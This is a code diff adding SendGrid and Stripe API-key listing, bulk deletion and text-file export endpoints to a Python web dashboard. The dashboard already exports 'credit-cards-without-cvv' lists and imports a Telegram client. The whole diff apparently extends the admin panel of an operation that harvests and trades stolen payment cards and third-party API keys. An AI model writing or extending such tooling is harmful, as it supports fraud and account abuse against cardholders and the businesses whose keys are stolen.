@@ -25,6 +25,7 @@ from telethon.errors import (
 )
 from secure_logging import recent_activity_logs
 from parse_credit_cards import format_credit_card_line
+from parse_api_keys import format_api_key_line
 
 LOG = logging.getLogger('dashboard')
 SESSION_MAX_AGE = 12 * 60 * 60
@@ -595,6 +596,49 @@ class Dashboard:
                 content,
                 media_type='text/plain',
                 headers={'Content-Disposition': 'attachment; filename=credit-cards-without-cvv.txt'},
+            )
+
+        @self.app.get('/api-keys')
+        async def get_api_keys(request: Request, limit: int = 1000):
+            self._require(request)
+            limit = max(1, min(int(limit), 5000))
+            split = await asyncio.to_thread(self.db.get_api_keys_split, limit)
+            out = {}
+            for key in ('sendgrid', 'stripe'):
+                keys, total = split[key]
+                for item in keys:
+                    item['line'] = format_api_key_line(item)
+                out[key] = {'total': total, 'showing': len(keys), 'keys': keys}
+            return out
+
+        @self.app.post('/api-keys/clear-all')
+        async def clear_api_keys(request: Request, csrf: str = Form(...)):
+            self._require_post(request, csrf)
+            count = await asyncio.to_thread(self.db.clear_all_api_keys)
+            return RedirectResponse(f'/?notice=Deleted+{count}+API+keys', 303)
+
+        @self.app.get('/api-keys/export-sendgrid')
+        async def export_api_keys_sendgrid(request: Request):
+            self._require(request)
+            keys = await asyncio.to_thread(lambda: self.db.get_all_api_keys(group='sendgrid'))
+            lines = [format_api_key_line(key) for key in keys]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=sendgrid-keys.txt'},
+            )
+
+        @self.app.get('/api-keys/export-stripe')
+        async def export_api_keys_stripe(request: Request):
+            self._require(request)
+            keys = await asyncio.to_thread(lambda: self.db.get_all_api_keys(group='stripe'))
+            lines = [format_api_key_line(key) for key in keys]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=stripe-keys.txt'},
             )
 
         @self.app.get('/session-regenerate')
